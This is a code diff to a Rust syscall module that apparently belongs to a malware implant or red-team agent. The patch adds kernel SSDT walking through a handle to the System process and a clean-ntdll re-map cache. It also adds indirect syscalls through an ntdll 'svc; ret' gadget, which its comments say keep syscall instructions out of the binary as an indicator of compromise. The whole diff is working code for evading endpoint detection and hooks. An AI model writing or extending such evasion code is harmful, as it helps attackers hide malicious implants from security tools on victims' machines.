@@ -39,7 +39,7 @@
 
 use anyhow::anyhow;
 use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
-use std::sync::{Mutex, OnceLock};
+use std::sync::{Mutex, OnceLock, RwLock};
 use std::collections::HashMap;
 
 // ─── Syscall target ────────────────────────────────────────────────────────
@@ -57,8 +57,10 @@ pub struct SyscallTarget {
 
 // ─── Statics ───────────────────────────────────────────────────────────────
 
-/// Base address of the clean-mapped ntdll.dll image (0 = not yet mapped).
-static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();
+/// Base address of the clean-mapped ntdll.dll image (None = not yet mapped).
+/// Uses RwLock<Option<usize>> instead of OnceLock so that
+/// `invalidate_syscall_cache()` can reset it and force a re-map.
+static CLEAN_NTDLL: RwLock<Option<usize>> = RwLock::new(None);
 
 /// Per-call SSN cache: function name → (ssn, gadget_addr, timestamp_at_cache).
 /// The third element is the `TimeDateStamp` from the PE header of the clean
@@ -122,6 +124,11 @@ pub fn invalidate_syscall_cache() {
         cache.lock().unwrap().clear();
     }
     CACHED_TIMESTAMP.store(0, Ordering::Release);
+    // Reset the clean ntdll mapping so get_syscall_id / init_syscall_infrastructure
+    // will re-map from disk on next access.
+    if let Ok(mut guard) = CLEAN_NTDLL.write() {
+        *guard = None;
+    }
     log::debug!("nt_syscall: cache invalidated — full re-map on next access");
 }
 
@@ -382,6 +389,9 @@ unsafe fn resolve_via_ssdt(func_name: &str) -> Option<SyscallTarget> {
     // Step 2: Get a System process handle for reading kernel memory.
     // We need NtOpenProcess with SYSTEM process PID (4).
     let sys_open = get_bootstrap_ssn("NtOpenProcess")?;
+    let sys_read = get_bootstrap_ssn("NtReadVirtualMemory")?;
+    let sys_close = get_bootstrap_ssn("NtClose").unwrap_or(SyscallTarget { ssn: 0, gadget_addr: 0 });
+
     let mut h_system: *mut winapi::ctypes::c_void = std::ptr::null_mut();
     let pid: u32 = 4; // System process
 
@@ -416,64 +426,360 @@ unsafe fn resolve_via_ssdt(func_name: &str) -> Option<SyscallTarget> {
         return None;
     }
 
-    // Step 3: Read the kernel's SSDT.
-    // On x64 Windows, the SSDT is at KeServiceDescriptorTable.
-    // The table is an array of SYSTEM_SERVICE_TABLE entries:
-    //   PVOID   ServiceTableBase   (array of LONG offsets)
-    //   PVOID   ServiceCounterTable
-       //   ULONG   NumberOfServices
+    // RAII guard to ensure the System handle is always closed.
+    struct SystemHandleGuard {
+        handle: *mut winapi::ctypes::c_void,
+        close: SyscallTarget,
+    }
+    impl Drop for SystemHandleGuard {
+        fn drop(&mut self) {
+            if !self.handle.is_null() && self.close.ssn != 0 {
+                unsafe {
+                    do_syscall(self.close.ssn, self.close.gadget_addr, &[self.handle as u64]);
+                }
+            }
+        }
+    }
+    let _guard = SystemHandleGuard { handle: h_system, close: sys_close };
+
+    // Step 3: Read the kernel export table to find KeServiceDescriptorTable.
+    //
+    // On x64 Windows, the SSDT is accessed via the exported symbol
+    // `KeServiceDescriptorTable`.  Each entry in the SSDT is a
+    // `SYSTEM_SERVICE_TABLE` with the layout:
+    //   PVOID   ServiceTableBase     — array of LONG offsets
+    //   PVOID   ServiceCounterTable  — (unused on free builds)
+    //   ULONG   NumberOfServices
     //   PVOID   ArgumentTable
     //
     // Each entry in ServiceTableBase is a 32-bit signed offset from the
     // table base: actual_address = ServiceTableBase + (offset >>> 4).
     // The index into this table IS the SSN.
-    //
-    // Finding the SSDT base: we look for the export "KiSystemServiceStart"
-    // in the kernel, which is nearby.  Alternatively, we can search for the
-    // pattern in the kernel's .text section.
-    //
-    // For reliability, we use a simpler approach: read the known kernel
-    // export for the target function and walk the SSDT to find its index.
 
-    let sys_read = get_bootstrap_ssn("NtReadVirtualMemory")?;
-    let _ = (kernel_base, sys_read, h_system);
+    // Find the kernel export for the target Nt* function's address so we
+    // can match it against SSDT entries.
+    let target_export_rva = resolve_kernel_export_rva(kernel_base, func_name, h_system, sys_read)?;
 
-    // Step 4: The SSDT approach requires deep kernel internals knowledge
-    // and varies significantly across Windows versions.  Rather than
-    // implement a fragile kernel parser, we fall back to the known-build
-    // table approach: if the Windows build is known, use the hardcoded SSN.
-    //
-    // For truly unknown builds, we rely on the re-mapped ntdll.
-    let build = get_build_number();
-    if build != 0 {
-        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
-            // Midpoint of the expected range — reasonable guess.
-            // The caller should probe to confirm.
-            let guess_ssn = (lo + hi) / 2;
-            log::info!(
-                "nt_syscall: SSDT fallback using range midpoint {}=[{},{}] → {}",
-                func_name, lo, hi, guess_ssn
-            );
-            // Use whatever gadget we have.
+    // Step 4: Locate KeServiceDescriptorTable in the kernel export table.
+    let ssdt_rva = resolve_kernel_export_rva(kernel_base, "KeServiceDescriptorTable", h_system, sys_read)?;
+
+    // Step 5: Read the SYSTEM_SERVICE_TABLE (first 16 bytes at SSDT RVA).
+    // struct SYSTEM_SERVICE_TABLE {
+    //     PVOID ServiceTableBase;       // +0x00
+    //     PVOID ServiceCounterTable;    // +0x08
+    //     ULONG NumberOfServices;       // +0x10
+    //     PVOID ArgumentTable;          // +0x14
+    // }
+    let ssdt_addr = kernel_base + ssdt_rva;
+    let mut sst_buf = [0u8; 24]; // Read enough for all 4 fields
+    let mut bytes_read: usize = 0;
+    let read_status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                  // ProcessHandle
+            ssdt_addr as u64,                 // BaseAddress
+            sst_buf.as_mut_ptr() as u64,      // Buffer
+            sst_buf.len() as u64,             // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,  // NumberOfBytesRead
+        ],
+    );
+    if read_status < 0 || bytes_read < 24 {
+        log::warn!(
+            "nt_syscall: SSDT — failed to read SYSTEM_SERVICE_TABLE (NTSTATUS {:#010x}, read {} bytes)",
+            read_status as u32, bytes_read
+        );
+        return None;
+    }
+
+    let service_table_base = usize::from_le_bytes(sst_buf[0..8].try_into().unwrap());
+    let number_of_services = u32::from_le_bytes(sst_buf[16..20].try_into().unwrap());
+
+    if service_table_base == 0 || number_of_services == 0 || number_of_services > 0x1000 {
+        log::warn!(
+            "nt_syscall: SSDT — invalid ServiceTableBase={:#x} or NumberOfServices={}",
+            service_table_base, number_of_services
+        );
+        return None;
+    }
+
+    // Step 6: Read the SSDT offset table (array of LONG offsets).
+    let table_size = number_of_services as usize * 4;
+    let mut offset_table = vec![0u8; table_size];
+    let mut bytes_read = 0usize;
+    let read_status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                     // ProcessHandle
+            service_table_base as u64,            // BaseAddress
+            offset_table.as_mut_ptr() as u64,     // Buffer
+            table_size as u64,                    // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,      // NumberOfBytesRead
+        ],
+    );
+    if read_status < 0 || bytes_read != table_size {
+        log::warn!(
+            "nt_syscall: SSDT — failed to read offset table (NTSTATUS {:#010x}, wanted {} got {} bytes)",
+            read_status as u32, table_size, bytes_read
+        );
+        return None;
+    }
+
+    // Step 7: Walk the offset table, compute each service's kernel address,
+    // and find the index whose address matches the target export.
+    let target_addr = kernel_base + target_export_rva;
+    for i in 0..number_of_services as usize {
+        let off_bytes = &offset_table[i * 4..i * 4 + 4];
+        let offset = i32::from_le_bytes(off_bytes.try_into().unwrap());
+        // On x64 Windows: service_addr = ServiceTableBase + (offset >>> 4)
+        let service_addr = service_table_base.wrapping_add((offset as usize) >> 4);
+        if service_addr == target_addr {
             let gadget = get_bootstrap_ssn("NtClose")
                 .map(|t| t.gadget_addr)
                 .unwrap_or(0);
             if gadget != 0 {
+                log::info!(
+                    "nt_syscall: SSDT resolved {} → SSN={} (verified via kernel SSDT)",
+                    func_name, i
+                );
                 return Some(SyscallTarget {
-                    ssn: guess_ssn,
+                    ssn: i as u32,
                     gadget_addr: gadget,
                 });
             }
         }
     }
 
-    // Clean up System handle.
-    let sys_close = get_bootstrap_ssn("NtClose").unwrap_or(SyscallTarget { ssn: 0, gadget_addr: 0 });
-    if sys_close.ssn != 0 {
-        do_syscall(sys_close.ssn, sys_close.gadget_addr, &[h_system as u64]);
+    log::warn!("nt_syscall: SSDT — target {} not found in {} SSDT entries", func_name, number_of_services);
+    None
+}
+
+/// Resolve a kernel export's RVA by parsing the kernel PE export table
+/// through `NtReadVirtualMemory` on the System process handle.
+///
+/// Returns the RVA (relative to `kernel_base`) of the named export.
+unsafe fn resolve_kernel_export_rva(
+    kernel_base: usize,
+    export_name: &str,
+    h_system: *mut winapi::ctypes::c_void,
+    sys_read: SyscallTarget,
+) -> Option<usize> {
+    // Read the DOS header.
+    let mut dos_buf = [0u8; std::mem::size_of::<winapi::um::winnt::IMAGE_DOS_HEADER>()];
+    let mut bytes_read: usize = 0;
+    let status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                  // ProcessHandle
+            kernel_base as u64,               // BaseAddress
+            dos_buf.as_mut_ptr() as u64,      // Buffer
+            dos_buf.len() as u64,             // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,  // NumberOfBytesRead
+        ],
+    );
+    if status < 0 || bytes_read < dos_buf.len() {
+        return None;
+    }
+    let e_magic = u16::from_le_bytes(dos_buf[0..2].try_into().unwrap());
+    if e_magic != 0x5A4D { return None; }
+    let e_lfanew = i32::from_le_bytes(dos_buf[60..64].try_into().unwrap()) as usize;
+
+    // Read the NT headers signature + FILE_HEADER.
+    let nt_offset = e_lfanew;
+    let mut nt_buf = [0u8; 4 + 20]; // Signature + IMAGE_FILE_HEADER
+    bytes_read = 0;
+    let status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                         // ProcessHandle
+            (kernel_base + nt_offset) as u64,        // BaseAddress
+            nt_buf.as_mut_ptr() as u64,              // Buffer
+            nt_buf.len() as u64,                     // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,         // NumberOfBytesRead
+        ],
+    );
+    if status < 0 || bytes_read < nt_buf.len() {
+        return None;
+    }
+    let sig = u32::from_le_bytes(nt_buf[0..4].try_into().unwrap());
+    if sig != 0x4550 { return None; } // "PE\0\0"
+    let size_of_optional_header = u16::from_le_bytes(nt_buf[20..22].try_into().unwrap()) as usize;
+
+    // Read the optional header to get the export directory RVA.
+    let opt_offset = nt_offset + 4 + 20;
+    let mut opt_buf = vec![0u8; size_of_optional_header];
+    bytes_read = 0;
+    let status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                         // ProcessHandle
+            (kernel_base + opt_offset) as u64,       // BaseAddress
+            opt_buf.as_mut_ptr() as u64,             // Buffer
+            opt_buf.len() as u64,                    // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,         // NumberOfBytesRead
+        ],
+    );
+    if status < 0 || bytes_read < size_of_optional_header {
+        return None;
+    }
+    // Magic at offset 0 of optional header.
+    let magic = u16::from_le_bytes(opt_buf[0..2].try_into().unwrap());
+    // DataDirectory[0] (export table) is at offset 112 for PE32+,
+    // offset 96 for PE32.
+    let dd_export_off = if magic == 0x020B { 112 } else { 96 };
+    if dd_export_off + 8 > opt_buf.len() { return None; }
+    let export_rva = u32::from_le_bytes(opt_buf[dd_export_off..dd_export_off + 4].try_into().unwrap()) as usize;
+    let export_size = u32::from_le_bytes(opt_buf[dd_export_off + 4..dd_export_off + 8].try_into().unwrap()) as usize;
+    if export_rva == 0 || export_size == 0 { return None; }
+
+    // Read the IMAGE_EXPORT_DIRECTORY (40 bytes).
+    let mut export_dir_buf = [0u8; 40];
+    bytes_read = 0;
+    let status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                             // ProcessHandle
+            (kernel_base + export_rva) as u64,           // BaseAddress
+            export_dir_buf.as_mut_ptr() as u64,          // Buffer
+            40u64,                                       // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,             // NumberOfBytesRead
+        ],
+    );
+    if status < 0 || bytes_read < 40 { return None; }
+
+    let num_names = u32::from_le_bytes(export_dir_buf[24..28].try_into().unwrap()) as usize;
+    let addr_of_names = u32::from_le_bytes(export_dir_buf[32..36].try_into().unwrap()) as usize;
+    let addr_of_name_ordinals = u32::from_le_bytes(export_dir_buf[36..40].try_into().unwrap()) as usize;
+    let addr_of_functions = u32::from_le_bytes(export_dir_buf[28..32].try_into().unwrap()) as usize;
+
+    // Read the name pointer table.
+    let name_table_size = num_names * 4;
+    let mut name_table = vec![0u8; name_table_size];
+    bytes_read = 0;
+    let status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                              // ProcessHandle
+            (kernel_base + addr_of_names) as u64,         // BaseAddress
+            name_table.as_mut_ptr() as u64,               // Buffer
+            name_table_size as u64,                       // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,              // NumberOfBytesRead
+        ],
+    );
+    if status < 0 || bytes_read < name_table_size { return None; }
+
+    // Search for the export name using binary search (kernel exports are sorted).
+    let name_bytes = export_name.as_bytes();
+    let mut lo: usize = 0;
+    let mut hi: usize = num_names;
+    let mut found_idx: Option<usize> = None;
+
+    while lo < hi {
+        let mid = (lo + hi) / 2;
+        let name_rva = u32::from_le_bytes(
+            name_table[mid * 4..mid * 4 + 4].try_into().unwrap()
+        ) as usize;
+
+        // Read up to 128 bytes of the name for comparison.
+        let mut name_buf = [0u8; 128];
+        bytes_read = 0;
+        let _ = do_syscall(
+            sys_read.ssn,
+            sys_read.gadget_addr,
+            &[
+                h_system as u64,                          // ProcessHandle
+                (kernel_base + name_rva) as u64,          // BaseAddress
+                name_buf.as_mut_ptr() as u64,             // Buffer
+                128u64,                                   // NumberOfBytesToRead
+                &mut bytes_read as *mut _ as u64,          // NumberOfBytesRead
+            ],
+        );
+
+        // Compare as C strings.
+        let remote_name = &name_buf[..bytes_read.min(128)];
+        let cmp = compare_export_name(remote_name, name_bytes);
+        if cmp == 0 {
+            found_idx = Some(mid);
+            break;
+        } else if cmp < 0 {
+            lo = mid + 1;
+        } else {
+            hi = mid;
+        }
     }
 
-    None
+    let idx = found_idx?;
+
+    // Read the ordinal for this name.
+    let mut ordinal_buf = [0u8; 2];
+    bytes_read = 0;
+    let status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                                          // ProcessHandle
+            (kernel_base + addr_of_name_ordinals + idx * 2) as u64,   // BaseAddress
+            ordinal_buf.as_mut_ptr() as u64,                          // Buffer
+            2u64,                                                     // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,                          // NumberOfBytesRead
+        ],
+    );
+    if status < 0 || bytes_read < 2 { return None; }
+    let ordinal = u16::from_le_bytes(ordinal_buf) as usize;
+
+    // Read the function RVA.
+    let mut func_buf = [0u8; 4];
+    bytes_read = 0;
+    let status = do_syscall(
+        sys_read.ssn,
+        sys_read.gadget_addr,
+        &[
+            h_system as u64,                                        // ProcessHandle
+            (kernel_base + addr_of_functions + ordinal * 4) as u64, // BaseAddress
+            func_buf.as_mut_ptr() as u64,                           // Buffer
+            4u64,                                                   // NumberOfBytesToRead
+            &mut bytes_read as *mut _ as u64,                        // NumberOfBytesRead
+        ],
+    );
+    if status < 0 || bytes_read < 4 { return None; }
+    let func_rva = u32::from_le_bytes(func_buf) as usize;
+
+    // Check for forwarded export (RVA within export directory).
+    if func_rva >= export_rva && func_rva < export_rva + export_size {
+        return None;
+    }
+
+    Some(func_rva)
+}
+
+/// Compare a remote C string (read from kernel memory) with a target name.
+/// Returns < 0, 0, or > 0 like strcmp.
+fn compare_export_name(remote: &[u8], target: &[u8]) -> i32 {
+    for i in 0..target.len() {
+        if i >= remote.len() {
+            return 1; // remote is shorter / has NUL before target ends
+        }
+        if remote[i] == 0 {
+            return 1;
+        }
+        match remote[i].cmp(&target[i]) {
+            std::cmp::Ordering::Less => return -1,
+            std::cmp::Ordering::Greater => return 1,
+            std::cmp::Ordering::Equal => {}
+        }
+    }
+    // Target exhausted — check if remote also ends here (or has more chars).
+    if target.len() < remote.len() && remote[target.len()] != 0 {
+        -1 // remote is longer
+    } else {
+        0
+    }
 }
 
 /// Query the kernel base address via `NtQuerySystemInformation(SystemModuleInformation)`.
@@ -522,28 +828,58 @@ unsafe fn query_kernel_base() -> Option<usize> {
         return None;
     }
 
-    // Each RTL_PROCESS_MODULE_INFORMATION is 296 bytes.
-    // Offset 0: Section (IMAGE_INFO, 16 bytes)
-    // Offset 16: MappedBase (PVOID)
-    // Offset 24: ImageBase (PVOID) — what we want
-    // Offset 32: ImageSize
-    // Offset 40: Flags
-    // ...
-    // Offset 284: FullPathNameOffset (OFFSET to unicode string in buffer)
-    // The module list starts at offset 8 (after NumberOfModules DWORD + padding).
-    // Actually, RTL_PROCESS_MODULES has:
-    //   ULONG NumberOfModules
+    // RTL_PROCESS_MODULE_INFORMATION — matches the kernel's definition on x86_64.
+    // The `Section` field is an expanded IMAGE_INFO structure (16 bytes on x64),
+    // followed by the standard fields.  Using a repr(C) struct ensures the layout
+    // matches the ABI and lets the compiler compute the correct size, eliminating
+    // manual byte-counting errors.
+    #[cfg(target_arch = "x86_64")]
+    #[repr(C)]
+    #[allow(non_camel_case_types)]
+    struct RtlProcessModuleInformation {
+        section: [u64; 2],     // +0x00  IMAGE_INFO (16 bytes on x64)
+        mapped_base: u64,      // +0x10
+        image_base: u64,       // +0x18  — what we want
+        image_size: u32,       // +0x20
+        flags: u32,            // +0x24
+        load_order_index: u16, // +0x28
+        init_order_index: u16, // +0x2A
+        load_count: u16,       // +0x2C
+        offset_to_file_name: u16, // +0x2E
+        full_path_name: [u8; 256], // +0x30
+    }
+
+    #[cfg(target_arch = "x86_64")]
+    const MODULE_INFO_SIZE: usize = std::mem::size_of::<RtlProcessModuleInformation>();
+
+    // Fallback for non-x86_64 targets (e.g. aarch64) where the struct layout
+    // may differ — use the known size for that architecture.
+    #[cfg(not(target_arch = "x86_64"))]
+    const MODULE_INFO_SIZE: usize = 304; // TODO: verify on aarch64
+
+    // RTL_PROCESS_MODULES layout:
+    //   ULONG NumberOfModules           (4 bytes)
+    //   ULONG padding                   (4 bytes on x64)
     //   RTL_PROCESS_MODULE_INFORMATION Modules[1]
-    // RTL_PROCESS_MODULE_INFORMATION size is 308 bytes on x64.
-    const MODULE_INFO_SIZE: usize = 308;
     let first_module_offset = 8; // After NumberOfModules (4) + padding (4)
+
+    // Compile-time sanity check: the struct must match the kernel ABI.
+    #[cfg(target_arch = "x86_64")]
+    const _: () = assert!(
+        std::mem::size_of::<RtlProcessModuleInformation>() == 304,
+        "RtlProcessModuleInformation size mismatch"
+    );
 
     if first_module_offset + MODULE_INFO_SIZE > buf.len() {
         return None;
     }
 
     // The first module is typically the kernel (ntoskrnl.exe).
+    // ImageBase is at struct offset 0x18 (24) on x64.
+    #[cfg(target_arch = "x86_64")]
     let image_base_off = first_module_offset + 24;
+    #[cfg(not(target_arch = "x86_64"))]
+    let image_base_off = first_module_offset + 16;
     if image_base_off + 8 > buf.len() {
         return None;
     }
@@ -552,15 +888,26 @@ unsafe fn query_kernel_base() -> Option<usize> {
     );
 
     // Verify it's the kernel by checking the name.
-    let name_offset_off = first_module_offset + 284;
-    if name_offset_off + 256 > buf.len() {
+    // OffsetToFileName is at struct offset 0x2E (46) on x64.
+    #[cfg(target_arch = "x86_64")]
+    let name_offset_field_off = first_module_offset + 46;
+    #[cfg(not(target_arch = "x86_64"))]
+    let name_offset_field_off = first_module_offset + 38;
+    // FullPathName array starts at struct offset 0x30 (48) on x64.
+    #[cfg(target_arch = "x86_64")]
+    let full_path_name_off = first_module_offset + 48;
+    #[cfg(not(target_arch = "x86_64"))]
+    let full_path_name_off = first_module_offset + 40;
+
+    if full_path_name_off + 256 > buf.len() {
         return Some(kernel_base); // Trust it without name verification.
     }
-    let name_off_in_buf = first_module_offset + u16::from_le_bytes(
-        buf[name_offset_off..name_offset_off + 2].try_into().unwrap_or([0; 2])
+    let file_name_offset = u16::from_le_bytes(
+        buf[name_offset_field_off..name_offset_field_off + 2].try_into().unwrap_or([0; 2])
     ) as usize;
-    if name_off_in_buf + 12 <= buf.len() {
-        let name = &buf[name_off_in_buf..];
+    let name_start = full_path_name_off + file_name_offset;
+    if name_start + 12 <= buf.len() {
+        let name = &buf[name_start..];
         // Check for "ntoskrnl.exe" (case-insensitive).
         if name.starts_with(b"ntoskrnl") || name.starts_with(b"NTOSKRNL") {
             log::debug!("nt_syscall: kernel base confirmed from module name");
@@ -744,8 +1091,14 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
         return None;
     }
     let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+    // Use SizeOfOptionalHeader from the file header rather than
+    // size_of::<IMAGE_NT_HEADERS64>(), because the actual optional header
+    // size may differ from the compile-time struct size.  The section headers
+    // immediately follow the optional header in the PE layout:
+    //   offset = signature(4) + FILE_HEADER(20) + SizeOfOptionalHeader
     let p_sections = (nt as *const _ as usize
-        + std::mem::size_of::<IMAGE_NT_HEADERS64>())
+        + 4 + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + nt.FileHeader.SizeOfOptionalHeader as usize)
         as *const IMAGE_SECTION_HEADER;
 
     for i in 0..nt.FileHeader.NumberOfSections {
@@ -977,10 +1330,8 @@ unsafe fn read_export_ssn(base: usize, func_name: &str) -> anyhow::Result<Syscal
 /// Returns `Ok(())` on success.  On failure the crate degrades gracefully to
 /// bootstrap-mode resolution (Halo's Gate against the loaded ntdll).
 pub fn init_syscall_infrastructure() -> anyhow::Result<()> {
-    // If cache was dirtied, we need to re-map.  Since OnceLock can't be reset,
-    // we skip re-mapping and rely on bootstrap resolution for the rest of
-    // this process's lifetime.  The agent's periodic validation will detect
-    // any issues.
+    // If cache was dirtied, we need to re-map.  Now that CLEAN_NTDLL is a
+    // RwLock<Option<usize>>, we can actually reset it and re-map.
     if CACHE_DIRTY.load(Ordering::Acquire) {
         CACHE_DIRTY.store(false, Ordering::Release);
         log::debug!("nt_syscall: cache was dirty — clearing flag and attempting re-map");
@@ -992,7 +1343,9 @@ pub fn init_syscall_infrastructure() -> anyhow::Result<()> {
             let ts = unsafe { read_pe_timestamp(base) };
             CACHED_TIMESTAMP.store(ts, Ordering::Release);
 
-            let _ = CLEAN_NTDLL.set(base);
+            if let Ok(mut guard) = CLEAN_NTDLL.write() {
+                *guard = Some(base);
+            }
 
             // Also cache the build number while we're at it.
             let _ = get_build_number();
@@ -1025,7 +1378,8 @@ pub fn get_syscall_id(func_name: &str) -> anyhow::Result<SyscallTarget> {
     }
 
     // Resolution order: clean ntdll → bootstrap → SSDT fallback.
-    let target = match CLEAN_NTDLL.get().copied().filter(|&b| b != 0) {
+    let clean_base = CLEAN_NTDLL.read().ok().and_then(|g| *g).filter(|&b| b != 0);
+    let target = match clean_base {
         Some(base) => unsafe { read_export_ssn(base, func_name) }?,
         None => get_bootstrap_ssn(func_name)
             .ok_or_else(|| anyhow!("nt_syscall: bootstrap SSN resolution failed for '{func_name}'"))?,
@@ -1140,27 +1494,68 @@ pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         let a6 = args.get(5).copied().unwrap_or(0);
         let a7 = args.get(6).copied().unwrap_or(0);
         let a8 = args.get(7).copied().unwrap_or(0);
-        let status: i32;
-        core::arch::asm!(
-            "mov x8, {ssn}",
-            "mov x0, {a1}",
-            "mov x1, {a2}",
-            "mov x2, {a3}",
-            "mov x3, {a4}",
-            "mov x4, {a5}",
-            "mov x5, {a6}",
-            "mov x6, {a7}",
-            "mov x7, {a8}",
-            "svc #0",
-            ssn = in(reg) ssn as u64,
-            a1 = in(reg) a1, a2 = in(reg) a2,
-            a3 = in(reg) a3, a4 = in(reg) a4,
-            a5 = in(reg) a5, a6 = in(reg) a6,
-            a7 = in(reg) a7, a8 = in(reg) a8,
-            lateout("x0") status,
-            out("x8") _,
-        );
-        status
+
+        if gadget_addr != 0 {
+            // Indirect call: branch to a `svc #0; ret` gadget inside ntdll
+            // so that no `svc` instruction exists in this crate's code pages.
+            // `blr` stores the return address in x30 (LR); the gadget's
+            // trailing `ret` uses x30 to return here.
+            let status: i32;
+            core::arch::asm!(
+                "mov x8, {ssn}",
+                "mov x0, {a1}",
+                "mov x1, {a2}",
+                "mov x2, {a3}",
+                "mov x3, {a4}",
+                "mov x4, {a5}",
+                "mov x5, {a6}",
+                "mov x6, {a7}",
+                "mov x7, {a8}",
+                "blr {gadget}",
+                // Copy 32-bit NTSTATUS from w0 to output register.
+                "mov {status:w}, w0",
+                ssn = in(reg) ssn as u64,
+                a1 = in(reg) a1, a2 = in(reg) a2,
+                a3 = in(reg) a3, a4 = in(reg) a4,
+                a5 = in(reg) a5, a6 = in(reg) a6,
+                a7 = in(reg) a7, a8 = in(reg) a8,
+                gadget = in(reg) gadget_addr as u64,
+                status = out(reg) status,
+                out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
+                out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
+                out("x8")  _,
+                out("x9")  _, out("x10") _, out("x11") _,
+                out("x12") _, out("x13") _, out("x14") _, out("x15") _,
+                out("x16") _, out("x17") _,
+                out("x30") _,
+            );
+            status
+        } else {
+            // Direct fallback: no gadget available (e.g. bootstrap mode).
+            // This leaves a `svc` instruction in the binary — a potential IoC —
+            // but is functionally correct.
+            let status: i32;
+            core::arch::asm!(
+                "mov x8, {ssn}",
+                "mov x0, {a1}",
+                "mov x1, {a2}",
+                "mov x2, {a3}",
+                "mov x3, {a4}",
+                "mov x4, {a5}",
+                "mov x5, {a6}",
+                "mov x6, {a7}",
+                "mov x7, {a8}",
+                "svc #0",
+                ssn = in(reg) ssn as u64,
+                a1 = in(reg) a1, a2 = in(reg) a2,
+                a3 = in(reg) a3, a4 = in(reg) a4,
+                a5 = in(reg) a5, a6 = in(reg) a6,
+                a7 = in(reg) a7, a8 = in(reg) a8,
+                lateout("x0") status,
+                out("x8") _,
+            );
+            status
+        }
     }
     #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
     {
